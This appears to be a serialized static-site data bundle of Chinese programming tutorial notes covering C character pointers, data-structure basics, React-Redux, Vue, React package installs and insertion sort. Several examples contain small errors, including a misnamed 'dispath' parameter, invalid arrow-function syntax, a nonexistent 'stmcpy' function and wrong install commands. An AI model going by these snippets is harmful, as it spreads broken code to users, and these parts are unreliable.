字符指针\n\n * 字符指针：指向字符串的指针变量\n\n#include <stdio.h>\n\nint main() {\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n\n    return 0;\n}\n\n\n\n# 字符指针做函数参数\n\n#include <stdio.h>\n\nvoid printstr(char *p) {\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n}\n\nint main() {\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n    printf("p的值为：%s\\n", p);\n\n    printstr(p);\n\n    return 0;\n}\n\n\n\n# const 修饰的指针变量\n\n * const 修饰的指针变量，指针变量指向的内存空间的值不能修改\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void){\n\n    const char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n\n    printf("p的值为：%s\\n", p);\n\n    //p[0] = \'h\'; //err, 指针变量p指向的内存空间的值不能修改\n\n    p = "hello world"; //ok, 指针变量p指向的内存空间的值可以修改\n\n    printf("p的值为：%p\\n", p);\n}\n\n\n\n\n# 指针数组做为main函数的参数\n\n> main 函数是操作系统调用的，第一个参数是 argc ，第二个参数是 argv ， argv 是一个指针数组，数组中的每一个元素都是一个指针，指向一个字符串\n\n#include <stdio.h>\n\nint main(int argc, char *argv[]){\n\n    char*a[]={ "hello", "world", "!" };\n    int i;\n\n    for (i = 0; i < argc; i++) {\n        printf("%s\\n", argv[i]);\n    }\n\n    return 0;\n\n}\n\n\n\n\n# 字符串处理函数\n\n函数名        功能                   参数                                         返回值      头文件\nstrlen     计算字符串的长度             const char *str                            size_t   string.h\nstrcpy     复制字符串                char *dest, const char *src                char *   string.h\nstrcat     字符串拼接                char *dest, const char *src                char *   string.h\nstrcmp     字符串比较                const char *str1, const char *str2         int      string.h\nstrchr     查找字符在字符串中第一次出现的位置    const char *str, int c                     char *   string.h\nstrstr     查找字符串在字符串中第一次出现的位置   const char *haystack, const char *needle   char *   string.h\nstrtok     分割字符串                char *str, const char *delim               char *   string.h\nstrerror   根据错误编号获取错误信息         int errnum                                 char *   string.h\nstmcpy     复制字符串                char *dest, const char *src, size_t n      char *   string.h\nstrncpy    复制字符串                char *dest, const char *src, size_t n      char *   string.h\n\n\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nint main(void){\n\n    char *p = "hello world";\n\n    printf("p的值为：%p\\n", p);\n\n    printf("p的值为：%s\\n", p);\n\n    //p[0] = \'h\'; //err, 指针变量p指向的内存空间的值不能修改\n\n    p = "hello world"; //ok, 指针变量p指向的内存空间的值可以修改\n\n    printf("p的值为：%p\\n", p);\n}\n\n',charsets:{cjk:!0}},{title:"数据结构的基本概念",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",relativePath:"数据结构/README.md",key:"v-2b5db4c6",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/",headers:[{level:2,title:"基本概念和术语",slug:"基本概念和术语",normalizedTitle:"基本概念和术语",charIndex:16},{level:3,title:"数据",slug:"数据",normalizedTitle:"数据",charIndex:2},{level:3,title:"数据元素",slug:"数据元素",normalizedTitle:"数据元素",charIndex:277},{level:3,title:"数据对象",slug:"数据对象",normalizedTitle:"数据对象",charIndex:400},{level:3,title:"数据类型",slug:"数据类型",normalizedTitle:"数据类型",charIndex:496},{level:3,title:"数据结构",slug:"数据结构",normalizedTitle:"数据结构",charIndex:2},{level:2,title:"算法和算法评价",slug:"算法和算法评价",normalizedTitle:"算法和算法评价",charIndex:659},{level:3,title:"算法的基本概念",slug:"算法的基本概念",normalizedTitle:"算法的基本概念",charIndex:671},{level:3,title:"算法效率的度量",slug:"算法效率的度量",normalizedTitle:"算法效率的度量",charIndex:1124}],headersStr:"基本概念和术语 数据 数据元素 数据对象 数据类型 数据结构 算法和算法评价 算法的基本概念 算法效率的度量",content:"# 数据结构的基本概念\n\n\n# 基本概念和术语\n\n\n# 数据\n\n * 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。\n * 数据是计算机程序加工的原料，是计算机程序处理的对象。数据是信息的表现形式，信息是数据的内涵。数据是信息的载体，信息是数据的外延。\n * 数据是客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。数据是计算机程序加工的原料，是计算机程序处理的对象。\n * 数据是信息的表现形式，信息是数据的内涵。数据是信息的载体，信息是数据的外延。\n\n\n# 数据元素\n\n数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干个数据项组成。数据项是数据不可分割的最小单位。例如，一个人的数据元素可以由姓名、性别、出生年月、身份证号码、家庭住址、联系电话等若干个数据项组成。\n\n\n# 数据对象\n\n数据对象是性质相同的数据元素的集合，是数据的一个子集。数据对象是数据的一个子集，数据元素是数据对象的一个成员。例如，一个班级的学生是一个数据对象，每个学生是一个数据元素。\n\n\n# 数据类型\n\n数据类型是一个值得集合和定义在此集合上的一组操作的总称。\n\n\n# 数据结构\n\n数据结构是相互之间存在一种或多种特定关系的数据元素的集合。在任何问题领域，数据元素都不是孤立存在的，它们之间存在着某种关系，这种数据元素之间的关系称为结构。数据结构包括三方面的内容：数据的逻辑结构、数据的存储结构和数据的运算。\n\n\n# 算法和算法评价\n\n\n# 算法的基本概念\n\n> 算法是解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。\n\n 1. 有穷性。算法必须保证执行有限的步骤之后，自动结束而不会出现无限循环，并且每一个步骤可以在有限时间内完成。\n 2. 确定性。算法中的每一条指令必须有确切的含义，且每一步都可在有穷时间内完成。\n 3. 可行性。算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成。\n 4. 输入。一个算法有零个或多个输入，这些输入取自于某个特定的对象的集合。\n 5. 输出。一个算法有一个或多个输出，这些输出是同输入有着某些特定关系的量。\n 6. 正确性。算法应该具有输入、输出和加工处理无歧义性、能正确反映问题的需求、能够得到问题的正确答案。\n 7. 可读性。算法应该具有良好的可读性，以便于阅读、理解和交流。\n 8. 健壮性。当输入数据不合法时，算法也能做出相关处理，而不是产生异常或莫名其妙的结果。 9.高效率与低存储量需求。算法执行时间短，运行所需存储量低。\n\n\n# 算法效率的度量\n\n> 算法的效率的度量是通过算法的时间复杂度和空间复杂度来描述的。\n\n# 时间复杂度\n\n# 空间复杂度",normalizedContent:"# 数据结构的基本概念\n\n\n# 基本概念和术语\n\n\n# 数据\n\n * 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。\n * 数据是计算机程序加工的原料，是计算机程序处理的对象。数据是信息的表现形式，信息是数据的内涵。数据是信息的载体，信息是数据的外延。\n * 数据是客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合。数据是计算机程序加工的原料，是计算机程序处理的对象。\n * 数据是信息的表现形式，信息是数据的内涵。数据是信息的载体，信息是数据的外延。\n\n\n# 数据元素\n\n数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干个数据项组成。数据项是数据不可分割的最小单位。例如，一个人的数据元素可以由姓名、性别、出生年月、身份证号码、家庭住址、联系电话等若干个数据项组成。\n\n\n# 数据对象\n\n数据对象是性质相同的数据元素的集合，是数据的一个子集。数据对象是数据的一个子集，数据元素是数据对象的一个成员。例如，一个班级的学生是一个数据对象，每个学生是一个数据元素。\n\n\n# 数据类型\n\n数据类型是一个值得集合和定义在此集合上的一组操作的总称。\n\n\n# 数据结构\n\n数据结构是相互之间存在一种或多种特定关系的数据元素的集合。在任何问题领域，数据元素都不是孤立存在的，它们之间存在着某种关系，这种数据元素之间的关系称为结构。数据结构包括三方面的内容：数据的逻辑结构、数据的存储结构和数据的运算。\n\n\n# 算法和算法评价\n\n\n# 算法的基本概念\n\n> 算法是解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。\n\n 1. 有穷性。算法必须保证执行有限的步骤之后，自动结束而不会出现无限循环，并且每一个步骤可以在有限时间内完成。\n 2. 确定性。算法中的每一条指令必须有确切的含义，且每一步都可在有穷时间内完成。\n 3. 可行性。算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成。\n 4. 输入。一个算法有零个或多个输入，这些输入取自于某个特定的对象的集合。\n 5. 输出。一个算法有一个或多个输出，这些输出是同输入有着某些特定关系的量。\n 6. 正确性。算法应该具有输入、输出和加工处理无歧义性、能正确反映问题的需求、能够得到问题的正确答案。\n 7. 可读性。算法应该具有良好的可读性，以便于阅读、理解和交流。\n 8. 健壮性。当输入数据不合法时，算法也能做出相关处理，而不是产生异常或莫名其妙的结果。 9.高效率与低存储量需求。算法执行时间短，运行所需存储量低。\n\n\n# 算法效率的度量\n\n> 算法的效率的度量是通过算法的时间复杂度和空间复杂度来描述的。\n\n# 时间复杂度\n\n# 空间复杂度",charsets:{cjk:!0}},{title:"Redux与React结合",frontmatter:{},regularPath:"/React/Redux/06-react-redux.html",relativePath:"React/Redux/06-react-redux.md",key:"v-4c2b1aaa",path:"/React/Redux/06-react-redux.html",headers:[{level:2,title:"Provider",slug:"provider",normalizedTitle:"provider",charIndex:102},{level:2,title:"connect",slug:"connect",normalizedTitle:"connect",charIndex:111},{level:3,title:"mapStateToProps",slug:"mapstatetoprops",normalizedTitle:"mapstatetoprops",charIndex:797},{level:3,title:"mapDispatchToProps",slug:"mapdispatchtoprops",normalizedTitle:"mapdispatchtoprops",charIndex:813},{level:2,title:"示例",slug:"示例",normalizedTitle:"示例",charIndex:2489},{level:3,title:"目录结构",slug:"目录结构",normalizedTitle:"目录结构",charIndex:2496},{level:3,title:"canstants/index.js",slug:"canstants-index-js",normalizedTitle:"canstants/index.js",charIndex:2915},{level:3,title:"actions/index.js",slug:"actions-index-js",normalizedTitle:"actions/index.js",charIndex:3016},{level:3,title:"reducers/index.js",slug:"reducers-index-js",normalizedTitle:"reducers/index.js",charIndex:3238},{level:3,title:"src/index.js",slug:"src-index-js",normalizedTitle:"src/index.js",charIndex:3545},{level:3,title:"src/app.js",slug:"src-app-js",normalizedTitle:"src/app.js",charIndex:3837}],headersStr:"Provider connect mapStateToProps mapDispatchToProps 示例 目录结构 canstants/index.js actions/index.js reducers/index.js src/index.js src/app.js",content:'# Redux与React结合\n\nRedux 是独立的，它与React没有任何关系。React-Redux是官方提供的一个库，用来结合redux和react的模块。\n\nReact-Redux提供了两个接口Provider、connect。\n\nimport { Provider,connect } from \'react-redux\';\n\n\n\n# Provider\n\n<Provider/>(是一个React组件)它是整个 Redux 应用的顶层组件，接受一个 store 作为 props，它的作用是保存store给子组件中的connect使用。\n\nimport { Provider } from \'react-redux\';\nimport { render } from \'react-dom\';\n\nrender(\n    <Provider store={store}>\n      <App />\n    </Provider>,\n    document.getElementById(\'root\')\n)\n\n\n> 注意：<Provider>只需要在渲染根组件时使用，可以让所有容器组件都可以访问 store，不需要每次使用的时候传递。\n\n\n# connect\n\n> connect() 函数提供了在整个 React 应用的任意组件中获取 store 中数据的功能。\n\nconnect 会把State和dispatch转换成props传递给子组件。它看起来是下面这样的：\n\nimport { connect } from \'react-redux\';\n\nclass App extends Component{\n    render(){\n        .....\n    }\n}\n\nexport default connect()(App);\n\n\nconnect方法接受两个参数：mapStateToProps和mapDispatchToProps\n\n\n# mapStateToProps\n\nmapStateToProps是一个函数，它接受state作为参数，返回一个对象。\n\nmapStateToProps需要负责的事情就是 返回需要传递给子组件的State,connect调用该函数后，在组件中就可以通过props读取到数据。\n\nvar mapStateToProps = state=>{\n  return { value: state }\n}\nexport default connect(mapStateToProps)(App);\n\n\n\n# mapDispatchToProps\n\nmapDispatchToProps用于建立组件跟store.dispatch的映射关系。\n\n// actions.js\nexport var increment = ()=>{\n    return {type:"INCREMENT"};\n}\nexport var decrement = ()=>{\n    return {type:"DECREMENT"}\n}\n// app.js\nimport {increment,decrement} from "./actions.js";\n\nvar mapDispatchToProps = dispatch =>{\n    return {\n        increment:()=>{ dispatch( increment() )},\n        decrement:()=>{ dispatch( decrement() )}\n    }\n}\nexport default connect(mapStateToProps,mapDispatchToProps)(App);\n\n\n# bindActionCreator\n\nbindActionCreator，可以直接将action包装成可以被调用的函数。\n\n// actions.js\nexport var increment = ()=>{\n    return {type:"INCREMENT"};\n}\nexport var decrement = ()=>{\n    return {type:"DECREMENT"}\n}\n// app.js\nimport {connect } from "react-redux";\nimport {bindActionCreators} from "redux";\nimport {increment,decrement} from "./actions.js";\n\n//写法一\nvar mapDispatchToProps = dispatch =>{\n    return {\n        increment:bindActionCreators(increment,dispatch),\n        decrement:bindActionCreators(decrement,dispatch)\n    }\n}\n//写法二\nvar mapDispatchToProps = dispatch =>{\n    return bindActionCreators({\n        increment:increment,\n        decrement:decrement\n    },dispatch)\n}\n\nexport default connect(mapStateToProps,mapDispatchToProps)(App);\n\n\n//使用connect()()创建并暴露一个App的容器组件\n自动调用dispatch react-redux 简写\nexport default connect(\n\tstate => (value: state),\n\t{\n\t\tincrement:increment,\n\t\tdecrement:decrement,\n\t}\n)(App)\n\n\n\n\n# 示例\n\n\n# 目录结构\n\n├── src/                         # 项目开发文件目录\n│      ├── actions/              # action目录 (Redux)\n│      │      └── index.js\n│      │\n│      ├── canstants/            # 公共常量目录 (Redux)\n│      │      └── index.js\n│      │\n│      ├── reducers/             # reducer目录 (Redux)\n│      │      └── index.js\n│      │\n│      ├── App.js                # 组件\n│      │\n│      ├── index.js              # 整个程序的入口文件\n│      │\n\n\n\n# canstants/index.js\n\nexport const INCREMENT = "INCREMENT";\nexport const DECREMENT = "DECREMENT";\n\n\n\n# actions/index.js\n\nimport {INCREMENT,DECREMENT} from "../canstants";\n\nexport function increment (){\n    return {\n        type:INCREMENT\n    }\n}\n\nexport function decrement(){\n    return {\n        type:DECREMENT\n    }\n}\n\n\n\n# reducers/index.js\n\nimport {INCREMENT,DECREMENT} from "../canstants";\n\nconst counter = (state = 0,action)=>{\n    switch (action.type){\n        case INCREMENT:\n        return state+1;\n        case DECREMENT:\n        return state-1;\n        default:\n        return state;\n    }\n}\n\nexport default counter;\n\n\n\n# src/index.js\n\nimport { createStore } from "redux";\nimport { Provider,connect } from "react-redux";\nimport reducer from "./reducers";\n\nvar store = createStore(reducer);\n\nReactDOM.render(\n    <Provider store={store}>\n        <App />\n    </Provider>\n    , document.getElementById(\'root\'));\n\n\n\n# src/app.js\n\nimport { connect} from "react-redux";\nimport {increment,decrement} from "./actions";\nimport {bindActionCreators} from "redux";\nclass App extends Component {\n  render() {\n    return (\n      <div className="App">\n        <div className="number">{this.props.counter}</div>\n        <div>\n          <button onClick={this.props.increment}>+</button>\n          <button onClick={this.props.decrement}>-</button>\n        </div>\n      </div>\n    );\n  }\n}\n//获取状态\nconst mapStateToProps = state=>{\n  return {\n    counter:state\n  }\n}\n//获取方法\nconst mapDispatchToProps = dispath =>{\n  return bindActionCreators({\n      increment,\n      decrement\n      },dispatch)\n}\n\nexport default connect(mapStateToProps,mapDispatchToProps)(App);\n\n\nhttps://zhuanlan.zhihu.com/p/20597452?refer=purerender',normalizedContent:'# redux与react结合\n\nredux 是独立的，它与react没有任何关系。react-redux是官方提供的一个库，用来结合redux和react的模块。\n\nreact-redux提供了两个接口provider、connect。\n\nimport { provider,connect } from \'react-redux\';\n\n\n\n# provider\n\n<provider/>(是一个react组件)它是整个 redux 应用的顶层组件，接受一个 store 作为 props，它的作用是保存store给子组件中的connect使用。\n\nimport { provider } from \'react-redux\';\nimport { render } from \'react-dom\';\n\nrender(\n    <provider store={store}>\n      <app />\n    </provider>,\n    document.getelementbyid(\'root\')\n)\n\n\n> 注意：<provider>只需要在渲染根组件时使用，可以让所有容器组件都可以访问 store，不需要每次使用的时候传递。\n\n\n# connect\n\n> connect() 函数提供了在整个 react 应用的任意组件中获取 store 中数据的功能。\n\nconnect 会把state和dispatch转换成props传递给子组件。它看起来是下面这样的：\n\nimport { connect } from \'react-redux\';\n\nclass app extends component{\n    render(){\n        .....\n    }\n}\n\nexport default connect()(app);\n\n\nconnect方法接受两个参数：mapstatetoprops和mapdispatchtoprops\n\n\n# mapstatetoprops\n\nmapstatetoprops是一个函数，它接受state作为参数，返回一个对象。\n\nmapstatetoprops需要负责的事情就是 返回需要传递给子组件的state,connect调用该函数后，在组件中就可以通过props读取到数据。\n\nvar mapstatetoprops = state=>{\n  return { value: state }\n}\nexport default connect(mapstatetoprops)(app);\n\n\n\n# mapdispatchtoprops\n\nmapdispatchtoprops用于建立组件跟store.dispatch的映射关系。\n\n// actions.js\nexport var increment = ()=>{\n    return {type:"increment"};\n}\nexport var decrement = ()=>{\n    return {type:"decrement"}\n}\n// app.js\nimport {increment,decrement} from "./actions.js";\n\nvar mapdispatchtoprops = dispatch =>{\n    return {\n        increment:()=>{ dispatch( increment() )},\n        decrement:()=>{ dispatch( decrement() )}\n    }\n}\nexport default connect(mapstatetoprops,mapdispatchtoprops)(app);\n\n\n# bindactioncreator\n\nbindactioncreator，可以直接将action包装成可以被调用的函数。\n\n// actions.js\nexport var increment = ()=>{\n    return {type:"increment"};\n}\nexport var decrement = ()=>{\n    return {type:"decrement"}\n}\n// app.js\nimport {connect } from "react-redux";\nimport {bindactioncreators} from "redux";\nimport {increment,decrement} from "./actions.js";\n\n//写法一\nvar mapdispatchtoprops = dispatch =>{\n    return {\n        increment:bindactioncreators(increment,dispatch),\n        decrement:bindactioncreators(decrement,dispatch)\n    }\n}\n//写法二\nvar mapdispatchtoprops = dispatch =>{\n    return bindactioncreators({\n        increment:increment,\n        decrement:decrement\n    },dispatch)\n}\n\nexport default connect(mapstatetoprops,mapdispatchtoprops)(app);\n\n\n//使用connect()()创建并暴露一个app的容器组件\n自动调用dispatch react-redux 简写\nexport default connect(\n\tstate => (value: state),\n\t{\n\t\tincrement:increment,\n\t\tdecrement:decrement,\n\t}\n)(app)\n\n\n\n\n# 示例\n\n\n# 目录结构\n\n├── src/                         # 项目开发文件目录\n│      ├── actions/              # action目录 (redux)\n│      │      └── index.js\n│      │\n│      ├── canstants/            # 公共常量目录 (redux)\n│      │      └── index.js\n│      │\n│      ├── reducers/             # reducer目录 (redux)\n│      │      └── index.js\n│      │\n│      ├── app.js                # 组件\n│      │\n│      ├── index.js              # 整个程序的入口文件\n│      │\n\n\n\n# canstants/index.js\n\nexport const increment = "increment";\nexport const decrement = "decrement";\n\n\n\n# actions/index.js\n\nimport {increment,decrement} from "../canstants";\n\nexport function increment (){\n    return {\n        type:increment\n    }\n}\n\nexport function decrement(){\n    return {\n        type:decrement\n    }\n}\n\n\n\n# reducers/index.js\n\nimport {increment,decrement} from "../canstants";\n\nconst counter = (state = 0,action)=>{\n    switch (action.type){\n        case increment:\n        return state+1;\n        case decrement:\n        return state-1;\n        default:\n        return state;\n    }\n}\n\nexport default counter;\n\n\n\n# src/index.js\n\nimport { createstore } from "redux";\nimport { provider,connect } from "react-redux";\nimport reducer from "./reducers";\n\nvar store = createstore(reducer);\n\nreactdom.render(\n    <provider store={store}>\n        <app />\n    </provider>\n    , document.getelementbyid(\'root\'));\n\n\n\n# src/app.js\n\nimport { connect} from "react-redux";\nimport {increment,decrement} from "./actions";\nimport {bindactioncreators} from "redux";\nclass app extends component {\n  render() {\n    return (\n      <div classname="app">\n        <div classname="number">{this.props.counter}</div>\n        <div>\n          <button onclick={this.props.increment}>+</button>\n          <button onclick={this.props.decrement}>-</button>\n        </div>\n      </div>\n    );\n  }\n}\n//获取状态\nconst mapstatetoprops = state=>{\n  return {\n    counter:state\n  }\n}\n//获取方法\nconst mapdispatchtoprops = dispath =>{\n  return bindactioncreators({\n      increment,\n      decrement\n      },dispatch)\n}\n\nexport default connect(mapstatetoprops,mapdispatchtoprops)(app);\n\n\nhttps://zhuanlan.zhihu.com/p/20597452?refer=purerender',charsets:{cjk:!0}},{title:"首页",frontmatter:{},regularPath:"/vue/",relativePath:"vue/README.md",key:"v-1f79180e",path:"/vue/",headers:[{level:3,title:"开发初衷",slug:"开发初衷",normalizedTitle:"开发初衷",charIndex:2},{level:3,title:"Vue.js 是什么",slug:"vue-js-是什么",normalizedTitle:"vue.js 是什么",charIndex:301}],headersStr:"开发初衷 Vue.js 是什么",content:"# 开发初衷\n\n2013年末，我还在Google Creative Lab工作。当时在项目中使用了一段时间的Angular，在感叹数据绑定带来生产力提升的同时，我也感到Angular的API设计过于繁琐，使得学习曲线颇为陡峭。出于对Angular数据绑定原理的好奇，我开始 “造轮子”，自己实现了一个非常粗糙的、基于依赖收集的数据绑定库。这就是Vue.js的前身。同时在实际开发中，我发现用户界面完全可以用嵌套的组件树来描述，而一个组件恰恰可以对应MVVM中的ViewModel。于是我决定将我的数据绑定实验改进成一个真正的开源项目，其核心思想便是 “数据驱动的组件系统”。\n\n——尤雨溪\n\n\n\n\n# Vue.js 是什么\n\n> 使用Vue.js可以让 Web开发变得简单，同时也颠覆了传统前端开发模式。\n\nVue.js是一套构建用户界面的渐进式框架。\n\nVue 的核心库只关注视图层，它不仅易于上手，还便于与第三方库或既有项目整合。\n\n当与单文件组件和 Vue 生态系统支持的库结合使用时，Vue 也完全能够为复杂的单页应用程序(SPA)提供驱动。\n\n> 渐进式的含义：没有多做职责之外的事。",normalizedContent:"# 开发初衷\n\n2013年末，我还在google creative lab工作。当时在项目中使用了一段时间的angular，在感叹数据绑定带来生产力提升的同时，我也感到angular的api设计过于繁琐，使得学习曲线颇为陡峭。出于对angular数据绑定原理的好奇，我开始 “造轮子”，自己实现了一个非常粗糙的、基于依赖收集的数据绑定库。这就是vue.js的前身。同时在实际开发中，我发现用户界面完全可以用嵌套的组件树来描述，而一个组件恰恰可以对应mvvm中的viewmodel。于是我决定将我的数据绑定实验改进成一个真正的开源项目，其核心思想便是 “数据驱动的组件系统”。\n\n——尤雨溪\n\n\n\n\n# vue.js 是什么\n\n> 使用vue.js可以让 web开发变得简单，同时也颠覆了传统前端开发模式。\n\nvue.js是一套构建用户界面的渐进式框架。\n\nvue 的核心库只关注视图层，它不仅易于上手，还便于与第三方库或既有项目整合。\n\n当与单文件组件和 vue 生态系统支持的库结合使用时，vue 也完全能够为复杂的单页应用程序(spa)提供驱动。\n\n> 渐进式的含义：没有多做职责之外的事。",charsets:{cjk:!0}},{title:"React开发技术",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/04-React%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF.html",relativePath:"React/React项目/04-React开发技术.md",key:"v-206fc08c",path:"/React/React%E9%A1%B9%E7%9B%AE/04-React%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF.html",headers:[{level:2,title:"React开发相关栈",slug:"react开发相关栈",normalizedTitle:"react开发相关栈",charIndex:85},{level:3,title:"React技术栈",slug:"react技术栈",normalizedTitle:"react技术栈",charIndex:100},{level:3,title:"开发环境相关",slug:"开发环境相关",normalizedTitle:"开发环境相关",charIndex:606},{level:3,title:"第三方插件",slug:"第三方插件",normalizedTitle:"第三方插件",charIndex:1335},{level:3,title:"组件库",slug:"组件库",normalizedTitle:"组件库",charIndex:1481}],headersStr:"React开发相关栈 React技术栈 开发环境相关 第三方插件 组件库",content:"# React开发技术\n\n> 采用React开发单页面(SPA)的架构方式的项目。\n\n基于React的项目的时候，我们需要使用各种各样的库来完成我们的项目开发。\n\n\n# React开发相关栈\n\n\n# React技术栈\n\n名称                 版本   大小   安装方式                                    描述\nreact                        npm install react                       React核心\nreact-dom                    npm install react-dom                   ReactDOM相关操作\nreact-router-dom             npm install react-router-dom            React路由相关\nredux                        npm install redux react-redux           Redux状态管理\nimmutable-js                 npm install immutable redux-immutable   Immutable Data 就是一旦创建，就不能再被更改的数据。\n\n\n# 开发环境相关\n\n名称                   版本   大小   安装方式                                  描述\nwebpack                        npm install webpack                   模块化打包工具\nwebpack-dev-server             npm install webpack-dev-server        webpack服务器环境\nbabel                          npm install babel-loader babel-core   JS语法编译器\nless                           npm install less                      css预处理\nsass                           npm install sass                      css预处理\nu-reset.css                    npm install u-reset.css               一个简洁的重置样式库\nwhatwg-fetch                   npm install whatwg-fetch              Fetch API\naxios                          npm install axios                     Axios 是一个基于 promise 的 HTTP 库\n\n\n# 第三方插件\n\n名称            版本   大小   安装                                     描述\nreact-swipe             npm install swipe-js-iso react-swipe   轮播图组件\n\n\n# 组件库\n\n名称[文档]              版本   大小   安装                               描述\nAnt Design                    npm install antd --save          用于开发和服务于企业级中后台产品\nAnt Design Mobile             npm install antd-mobile --save   是 Ant Design 的移动规范的 React 实现\nAntV G2                       npm install @antv/g2 --save      数据驱动的高交互可视化图形语法\nAntV G6                       npm install @antv/g6 --save      专注解决流程与关系分析的图表库\nAntV F2                       nnpm install @antv/f2 --save     适于对性能、体积、扩展性要求严苛场景下使用的移动端图表库\nAntV L7                       nnpm install @antv/g2 --save     地理空间数据可视化框架，易用易扩展。",normalizedContent:"# react开发技术\n\n> 采用react开发单页面(spa)的架构方式的项目。\n\n基于react的项目的时候，我们需要使用各种各样的库来完成我们的项目开发。\n\n\n# react开发相关栈\n\n\n# react技术栈\n\n名称                 版本   大小   安装方式                                    描述\nreact                        npm install react                       react核心\nreact-dom                    npm install react-dom                   reactdom相关操作\nreact-router-dom             npm install react-router-dom            react路由相关\nredux                        npm install redux react-redux           redux状态管理\nimmutable-js                 npm install immutable redux-immutable   immutable data 就是一旦创建，就不能再被更改的数据。\n\n\n# 开发环境相关\n\n名称                   版本   大小   安装方式                                  描述\nwebpack                        npm install webpack                   模块化打包工具\nwebpack-dev-server             npm install webpack-dev-server        webpack服务器环境\nbabel                          npm install babel-loader babel-core   js语法编译器\nless                           npm install less                      css预处理\nsass                           npm install sass                      css预处理\nu-reset.css                    npm install u-reset.css               一个简洁的重置样式库\nwhatwg-fetch                   npm install whatwg-fetch              fetch api\naxios                          npm install axios                     axios 是一个基于 promise 的 http 库\n\n\n# 第三方插件\n\n名称            版本   大小   安装                                     描述\nreact-swipe             npm install swipe-js-iso react-swipe   轮播图组件\n\n\n# 组件库\n\n名称[文档]              版本   大小   安装                               描述\nant design                    npm install antd --save          用于开发和服务于企业级中后台产品\nant design mobile             npm install antd-mobile --save   是 ant design 的移动规范的 react 实现\nantv g2                       npm install @antv/g2 --save      数据驱动的高交互可视化图形语法\nantv g6                       npm install @antv/g6 --save      专注解决流程与关系分析的图表库\nantv f2                       nnpm install @antv/f2 --save     适于对性能、体积、扩展性要求严苛场景下使用的移动端图表库\nantv l7                       nnpm install @antv/g2 --save     地理空间数据可视化框架，易用易扩展。",charsets:{cjk:!0}},{title:"插入排序",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/01-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.html",relativePath:"数据结构/排序/01-插入排序.md",key:"v-62f4f016",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/01-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.html",headers:[{level:2,title:"算法思想",slug:"算法思想",normalizedTitle:"算法思想",charIndex:11},{level:2,title:"算法分析",slug:"算法分析",normalizedTitle:"算法分析",charIndex:2061},{level:3,title:"时间复杂度",slug:"时间复杂度",normalizedTitle:"时间复杂度",charIndex:2070},{level:3,title:"空间复杂度",slug:"空间复杂度",normalizedTitle:"空间复杂度",charIndex:2172},{level:3,title:"稳定性",slug:"稳定性",normalizedTitle:"稳定性",charIndex:2190},{level:2,title:"折半插入排序",slug:"折半插入排序",normalizedTitle:"折半插入排序",charIndex:2204}],headersStr:"算法思想 算法分析 时间复杂度 空间复杂度 稳定性 折半插入排序",content:"# 插入排序\n\n\n# 算法思想\n\n> 每次将一个待排序的记录，按其关键字大小插入到前面已经排好序的子序列中的适当位置，直到全部记录插入完成为止。\n\n// 举例\nint arr[] = { 3, 1, 5, 7, 2, 4, 9, 6 };\n\n// 第一轮替换\nint arr[] = { 1, 3, 5, 7, 2, 4, 9, 6 };\n\n// 第二轮替换\nint arr[] = { 1, 2, 3, 5, 7, 4, 9, 6 };\n\n// 第三轮替换\nint arr[] = { 1, 2, 3, 4, 5, 7, 9, 6 };\n\n// 第四轮替换\nint arr[] = { 1, 2, 3, 4, 5, 6, 7, 9 };\n\n// 代码实现 \nvoid insertSort(int *arr, int length) {\n    int i, j, temp;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 1; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 保存当前元素\n            temp = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; j >= 0 && arr[j] > temp; --j) {\n              //这里将大于temp的数都后移一位\n                arr[j + 1] = arr[j];\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = temp;\n\n        }\n    }\n}\n\n//第二种实现方式 （这种方式比较好理解）\nvoid insertSort(int *arr, int length) {\n    int i, j, temp;\n    // 从第二个元素开始，因为第一个元素默认是有序的\n    for (i = 1; i < length; ++i) {\n        // 如果当前元素比前一个元素小，那么就需要将当前元素插入到前面的有序序列中\n        if (arr[i] < arr[i - 1]) {\n            // 保存当前元素\n            temp = arr[i];\n            // 从当前元素的前一个元素开始，依次和当前元素比较，如果比当前元素大，那么就将该元素后移一位\n            for (j = i - 1; j >= 0; --j) {\n                if (arr[j] > temp) {\n                    arr[j + 1] = arr[j];\n                } else {\n                    break;\n                }\n            }\n            // 将当前元素插入到合适的位置\n            arr[j + 1] = temp;\n\n        }\n    }\n}\n\n// 第三种实现方式 (带哨兵) 